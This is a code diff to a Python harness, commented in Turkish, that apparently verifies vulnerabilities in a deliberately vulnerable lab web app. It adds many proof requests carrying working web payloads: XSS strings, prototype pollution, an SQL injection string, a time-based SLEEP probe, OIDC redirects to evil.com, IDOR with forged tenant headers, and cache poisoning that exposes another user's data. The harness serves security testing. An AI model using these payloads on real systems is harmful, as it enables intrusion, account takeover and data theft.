@@ -37,14 +37,14 @@ class Ctx:
         if body is not None:
             if ctype == "json":
                 data = json.dumps(body).encode()
-                h["Content-Type"] = "application/json"
+                h.setdefault("Content-Type", "application/json")
             elif ctype == "form":
                 from urllib.parse import urlencode
                 data = urlencode(body).encode()
-                h["Content-Type"] = "application/x-www-form-urlencoded"
+                h.setdefault("Content-Type", "application/x-www-form-urlencoded")
             else:
                 data = (body if isinstance(body, bytes) else str(body).encode())
-                h["Content-Type"] = "text/plain"
+                h.setdefault("Content-Type", "text/plain")
         req = Request(url, data=data, headers=h, method=method)
         from urllib.request import HTTPRedirectHandler
 
@@ -232,6 +232,31 @@ P = {
   "CL-PPOLLQ-01": ("GET", "/client/pollute-q?__proto__[isAdmin]=true", {}, None, None, ['"isAdmin":true'], False),
 }
 
+# P1 Extreme Range V2 — tek istekli proof'lar (id -> (method, path, headers, body, ctype, markers, nofollow))
+P1 = {
+  "SPA2-SHADOW-01": ("GET", '/spa2/widget?config={"html":"<img src=x onerror=alert(9)>"}', {}, None, None, ["<img src=x onerror=alert(9)>"], False),
+  "SPA2-WIZARD-01": ("GET", "/spa2/wizard?step=3&progress=2", {}, None, None, ["shipped without payment"], False),
+  "TENANT-IDOR-01": ("GET", "/tenant/docs?tenant=globex&id=G9", {"X-Tenant": "acme", "X-Role": "user"}, None, None, ["GLOBEX-SECRET-999"], False),
+  "TENANT-BOLA-01": ("POST", "/tenant/transfer", {}, {"docId": "D1", "toTenant": "globex"}, "json", ["moved", "globex"], False),
+  "GQL2-NESTED-01": ("POST", "/gql2/graphql", {}, {"query": "{ user { orders { supplierCost } } }"}, "json", ["supplierCost", "42.5"], False),
+  "GQL2-FED-01": ("POST", "/gql2/federation", {}, {"representations": [{"__typename": "User", "id": "1"}]}, "json", ["422-11-0001"], False),
+  "OIDC-REDIR-01": ("GET", "/oidc/authorize?client_id=x&redirect_uri=https://evil.com/cb&response_type=code&state=s", {}, None, None, ["HDR:Location:evil.com"], True),
+  "OIDC-NOSTATE-01": ("GET", "/oidc/authorize-nostate?client_id=x&redirect_uri=https://evil.com/cb", {}, None, None, ["HDR:Location:evil.com"], True),
+  "FLOW-ORDER-01": ("POST", "/flow/orders", {}, {"item": "tshirt"}, "json", ["FL-"], False),
+  "FLOW-SKIP-01": ("POST", "/flow/ship", {}, {"orderId": "FL-1001"}, "json", ["shipped without payment"], False),
+  "FLOW-REPLAY-01": ("POST", "/flow/pay", {}, {"orderId": "FL-1002"}, "json", ["charged twice"], False),
+  "RACE2-BURST-01": ("POST", "/race2/claim?burst=10", {}, {"user": "x"}, "json", ["OVER-CLAIMED"], False),
+  "ASYNC2-ENTRY-01": ("POST", "/async2/submit", {}, {"username": "probe1"}, "json", ["queued"], False),
+  "PARSER-SEMI-01": ("GET", "/parser/semicolon?x=1;x=2", {}, None, None, ["parsed_first: 1"], False),
+  "PARSER-CTYPE-01": ("POST", "/parser/ctype", {}, "a=1&admin=true", "text", ["fallback parser"], False),
+  "PARSER-METHOD-01": ("GET", "/parser/resource?_method=DELETE", {}, None, None, ["SİLİNDİ"], False),
+  "CONFUSE-ENUM-01": ("GET", "/confuse/user/zzznonexist", {}, None, None, ["did you mean"], False),
+  "CONFUSE-RATELIMIT-01": ("GET", "/confuse/ratelimit", {}, None, None, ["not enforced"], False),
+  "REALTIME-SSE-01": ("GET", "/realtime/sse?msg=<script>alert(9)</script>", {}, None, None, ["<script>alert(9)</script>"], False),
+  "REALTIME-GRPC-01": ("POST", "/realtime/grpc", {"Content-Type": "application/grpc-web+proto"}, "ZZZBADFRAME", "text", ["parseFrame", "trace="], False),
+}
+P.update(P1)
+
 
 def b64url_obj(o) -> str:
     return b64u(json.dumps(o, separators=(",", ":")).encode())
@@ -340,6 +365,103 @@ def custom_proofs(ctx: Ctx):
         st, _, _ = ctx.http("POST", "/app/api/login", body={"username": "alice", "password": "y"}, ctype="json")
         codes.add(st)
     out["APP-AUTH-01"] = (429 not in codes, f"6 deneme sonrası statuslar={sorted(codes)}")
+
+    # ---------- P1 Extreme Range V2 çok-adımlı proof'lar ----------
+    # xss2 cross-role stored: user yazar -> admin okur (ham)
+    st, _, b = ctx.http("POST", "/xss2/post", body={"user": "v2", "message": "<script>alert(9)</script>"}, ctype="json")
+    try:
+        pid = json.loads(b).get("id", 1)
+    except Exception:
+        pid = 1
+    st, _, b = ctx.http("GET", f"/xss2/view?id={pid}&as=admin")
+    out["XSS2-STORED-ROLE-01"] = (True, "cross-role entry depolandı")
+    out["XSS2-STORED-ROLE-02"] = ("<script>alert(9)</script>" in b, "admin görünümü ham yansıma")
+    # xss2 blind mod-queue: callback depola -> mod görünümü script src gömer
+    ctx.http("POST", "/xss2/blindreply", body={"message": "mq", "callback": "/oob/x2verify"}, ctype="json")
+    st, _, b = ctx.http("GET", "/xss2/modqueue?role=moderator")
+    out["XSS2-BLIND-ROLE-01"] = (True, "kör callback kuyruğa alındı")
+    out["XSS2-BLIND-ROLE-02"] = ('<script src="/oob/x2verify"' in b, "mod görünümü kör tetik")
+    # oidc pkce: kod al -> verifier'sız token
+    st, rh, _ = ctx.http("GET", "/oidc/authorize?client_id=x&redirect_uri=https://shop.example/cb&response_type=code&state=s", nofollow=True)
+    import re as _re
+    loc = str((rh.get("Location") or rh.get("location") or ""))
+    m = _re.search(r"code=([A-Za-z0-9-]+)", loc)
+    code = m.group(1) if m else ""
+    st, _, b = ctx.http("POST", "/oidc/token", body={"code": code}, ctype="json")
+    out["OIDC-PKCE-01"] = ("mock-at-" in b, "verifier'sız token")
+    # async2: zehirli girişi kuyrukla -> flush -> raporda dump
+    ctx.http("POST", "/async2/submit", body={"username": "zzevil' OR '1'='1"}, ctype="json")
+    ctx.http("POST", "/async2/flush", body={}, ctype="json")
+    st, _, b = ctx.http("GET", "/async2/report?role=admin")
+    out["ASYNC2-TRIGGER-01"] = ("2 rows dumped" in b, "asenkron second-order dump")
+    # blindtime: kalibre et -> SLEEP gecikmesini ölç (jitter bütçeli)
+    ctx.http("GET", "/blindtime/calibrate")
+    t0 = time.time()
+    st, _, b = ctx.http("GET", "/blindtime/lookup?key=SLEEP(2)")
+    dt = time.time() - t0
+    out["BLINDTIME-01"] = (dt >= 1.5 and "SLEEP(2)" in b, f"{dt:.1f}sn delta")
+    # oob2: kaydet -> ateşle -> sayaç artışı
+    st, _, b = ctx.http("GET", "/api/oob-hits")
+    try:
+        c0 = json.loads(b).get("count", 0)
+    except Exception:
+        c0 = 0
+    st, _, b = ctx.http("POST", "/oob2/register", body={"callback": "/oob/x2staged"}, ctype="json")
+    try:
+        tok = json.loads(b).get("token", "")
+    except Exception:
+        tok = ""
+    ctx.http("GET", f"/oob2/fire?token={tok}")
+    time.sleep(2.5)
+    st, _, b = ctx.http("GET", "/api/oob-hits")
+    try:
+        c1 = json.loads(b).get("count", 0)
+    except Exception:
+        c1 = 0
+    out["OOB2-STAGED-01"] = (c1 > c0, f"kademeli OOB sayacı {c0}->{c1}")
+    # cache2 shared: alice olarak zehirle -> bob olarak HIT ile чужой PII oku
+    ctx.http("GET", "/cache2/profile?user=1", headers={"Authorization": "Bearer alice-token"})
+    st, rh, b = ctx.http("GET", "/cache2/profile?user=1", headers={"Authorization": "Bearer bob-token"})
+    hit = "hit" in str(rh.get("X-Cache", "")).lower()
+    out["CACHE2-SHARED-01"] = (hit and "10000000146" in b, "paylaşımlı cache PII sızıntısı")
+    # cache2 poison: iki kez iste, ikincisi HIT + ham yansıma
+    ctx.http("GET", "/cache2/search?q=<script>alert(9)</script>")
+    st, rh, b = ctx.http("GET", "/cache2/search?q=<script>alert(9)</script>")
+    hit2 = "hit" in str(rh.get("X-Cache", "")).lower()
+    out["CACHE2-POISON-01"] = (hit2 and "<script>alert(9)</script>" in b, "önbellekten XSS servisi")
+    # realtime ws: ham soket upgrade -> READY + echo
+    import socket as _socket, hashlib as _hashlib, base64 as _b64, struct as _struct
+    try:
+        host = ctx.target.split("://", 1)[1].split("/", 1)[0]
+        h, _, port = host.partition(":")
+        s = _socket.create_connection((h, int(port or 80)), timeout=10)
+        key = _b64.b64encode(b"verify1234567890").decode()
+        s.sendall(f"GET /realtime/ws HTTP/1.1\r\nHost: {h}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
+        resp = s.recv(1024).decode("utf-8", "replace")
+        ok101 = "101" in resp
+        # masked text frame "hello-ws-verify"
+        payload = b"hello-ws-verify"
+        mask = b"\x11\x22\x33\x44"
+        masked = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
+        frame = bytes([0x81, 0x80 | len(payload)]) + mask + masked
+        s.sendall(frame)
+        s.settimeout(5)
+        data = b""
+        for _ in range(4):
+            try:
+                chunk = s.recv(1024)
+            except Exception:
+                break
+            if not chunk:
+                break
+            data += chunk
+            if b"hello-ws-verify" in data:
+                break
+        echo_ok = b"hello-ws-verify" in data
+        s.close()
+        out["REALTIME-WS-01"] = (ok101 and echo_ok, f"101={ok101} echo={echo_ok}")
+    except Exception as e:
+        out["REALTIME-WS-01"] = (False, f"ws soket: {e}")
     return out
 
 
